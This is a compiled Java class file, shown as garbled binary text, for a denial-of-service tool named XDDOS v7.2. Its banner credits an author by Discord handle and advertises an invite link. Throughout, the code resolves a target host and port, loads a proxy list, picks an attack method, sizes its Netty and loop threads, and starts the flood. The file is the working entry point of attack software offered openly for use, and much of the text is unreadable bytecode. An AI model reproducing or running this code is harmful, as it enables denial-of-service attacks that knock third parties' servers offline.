ΚώΊΎ   7  XD/XDDOS/XDDOS  java/lang/Object 	proxyFile Ljava/io/File; origIP Ljava/lang/String; 	srvRecord resolved Ljava/net/InetAddress; port I 	protcolID protocolLength methodID method LXD/XDDOS/methods/IMethod; duration 	targetCPS nettyThreads loopThreads string proxies "LXD/XDDOS/utils/proxy/ProxyLoader; 	cpuselect serverhp DISCORD_USERNAME ConstantValue  CatOnDrugs#1521 attackRunning Z RED_BOLD $ [1;31m 
GREEN_BOLD ' [1;32m PURPLE_BOLD * [1;35m 
WHITE_BOLD - [1;37m RESET 0 [0m 	CYAN_BOLD 3 [1;36m <clinit> ()V Code	  8   ! LineNumberTable LocalVariableTable <init>
  = ; 5 this LXD/XDDOS/XDDOS; main ([Ljava/lang/String;)V 
Exceptions D java/lang/Throwable F file.encoding H UTF-8
 J L K java/lang/System M N setProperty 8(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;	 J P Q R out Ljava/io/PrintStream;
 T V U java/io/PrintStream W 5 println YQ[1;37mβββ  ββββββββββ βββββββ  βββββββ ββββββββ
βββββββββββββββββββββββββββββββββββββββββ
 ββββββ βββ  ββββββ  ββββββ   βββββββββββ
 ββββββ βββ  ββββββ  ββββββ   βββββββββββ
ββββ ββββββββββββββββββββββββββββββββββββ
βββ  ββββββββββ βββββββ  βββββββ ββββββββ
 v7.2
[1;31mMADE BY: [1;37mCatOnDrugs#1521
[1;37m> [1;35mDISCORD: [1;32mhttp://discord.io/XDDOS
[1;37m> [1;37mStarting XDDOS :-
[0m
[1;32mSTARTING
[0m
 T [ W \ (Ljava/lang/String;)V
 ^ ` _  XD/XDDOS/utils/helper/ArgsHelper a A 
UserFrndly
 ^ c d A OneLine args [Ljava/lang/String; StackMapTable run j :[1;32m[[1;31mXDDOS[1;32m][1;37m Resolving Target IP...	  l  
 n p o #XD/XDDOS/utils/helper/ServerAddress q r 	getAddrss 9(Ljava/lang/String;)LXD/XDDOS/utils/helper/ServerAddress;
 n t u v getIP ()Ljava/lang/String;	  x 	 
 n z { | getPort ()I	  ~  
    java/net/InetAddress   	getByName *(Ljava/lang/String;)Ljava/net/InetAddress;	   
   java/lang/StringBuilder  +[1;32m[[1;37mResolved IP:[1;32m][1;37m 
   ; \
    v getHostAddress
     append -(Ljava/lang/String;)Ljava/lang/StringBuilder;  

    v toString  :
    java/lang/String    split '(Ljava/lang/String;)[Ljava/lang/String;	  ’  	  €  @Y      @I      @³     
 ¬ ? ­ java/lang/Math ― ° ceil (D)D	  ²  ?Dψ΅γhρ	  Ά  >τψ'I	  Ί  	  Ό  	  Ύ   ΐ nettyThreads: 
  Β  Γ (I)Ljava/lang/StringBuilder; Ε 
loopThreads:  Η java/util/Random
 Ζ =	  Κ  
  Μ Ν Ξ valueOf &(Ljava/lang/Object;)Ljava/lang/String;
 Ζ Π Ρ ? nextInt (I)I
  Τ  Υ (C)Ljava/lang/StringBuilder;   
 Ψ Ϊ Ω java/lang/Exception Ϋ 5 printStackTrace      
 ί α ΰ java/lang/Thread β γ sleep (J)V
 ε η ζ XD/XDDOS/methods/Methods θ 5 setupMethods	  κ  
 ε μ ν ξ 	getMethod .(Ljava/lang/String;)LXD/XDDOS/methods/IMethod;	  π   ς .[1;32m[[1;37mRunning Method:[1;32m][1;37m 
   υ @
 χ ω ψ XD/XDDOS/utils/NettyBootstrap ϊ 5 start sa %LXD/XDDOS/utils/helper/ServerAddress; r Ljava/util/Random; i var4 Ljava/lang/Exception; 
SourceFile 
XDDOS.java !      	     	     	 	    	 
    	     	     	     	     	     	     	     	     	     	     	     	     	              	   !    "       #  %       &  (       )  +       ,  .       /  1       2   4 5  6   )      ³ 7±    9   
    "  ) :       ; 5  6   /     *· <±    9        :        > ?   	 @ A  B     C 6        /EGΈ IW² OΆ S² OΆ S² OXΆ Z*Ύ 
*Έ ]§ *Έ b±    9   & 	   ,  -  .  /  < # = ' > * @ . B :       / e f   g    * 	 h 5  B     C 6  G 	   m² 7i³ 7² OiΆ Z² kΈ mK*Ά s³ w*Ά y³ }² wΈ ³ ² O» Y· ² Ά Ά Ά /Ά Ά Ά Z² kΆ 2³ ‘² £² £ ₯o §² £ ©ockΈ «`³ ±² ±  	 §  ³² ±kΈ «³ ΅² ±  §  ·² ±kΈ «³ Ή² » € § ³ ½² O» YΏ· ² ΅Ά ΑΔΆ ² ΉΆ ΑΆ Ά Z» ΖY· ΘL=§ &² Ι» Z_Έ Λ· +}Ά Ο`Ά ΣΆ ³ ΙΦ‘?Ϊ§ K*Ά Χ άΈ ή±Έ δ² ιΈ λ³ ο² O» Yρ· ² οΆ στΆ 2Ά Ά /Ά Ά Ά ZΈ φ±  
"% Ψ  9   f    E  F 
 H  I  J   K ' L 0 M U N b O  P  Q Έ R Ι S μ T τ W" Y& Z* [0 \1 _4 `= ai cl e :   *  	 ϋ ό   τ . ύ ώ  φ , ?  &     g   $ ό  nKK@ύ 2 Ζ"?     Ψ:    